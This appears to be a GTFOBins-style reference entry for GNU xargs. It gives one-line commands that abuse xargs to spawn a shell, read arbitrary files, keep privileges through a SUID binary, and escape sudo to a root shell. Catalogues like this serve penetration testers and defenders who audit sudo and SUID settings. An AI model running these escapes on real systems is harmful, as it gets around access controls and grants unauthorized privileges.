---
functions:
  execute-interactive:
    - description: GNU version only.
      code: xargs -a /dev/null sh
  file-read:
    - description: This works as long as the file does not contain the NUL character, also a trailing `$'\n'` is added. The actual `/bin/echo` command is executed. GNU version only.
      code: |
        LFILE=file_to_read
        xargs -a "$LFILE" -0
  suid-enabled:
    - description: GNU version only.
      code: ./xargs -a /dev/null sh -p
  sudo-enabled:
    - description: GNU version only.
      code: sudo xargs -a /dev/null sh
---
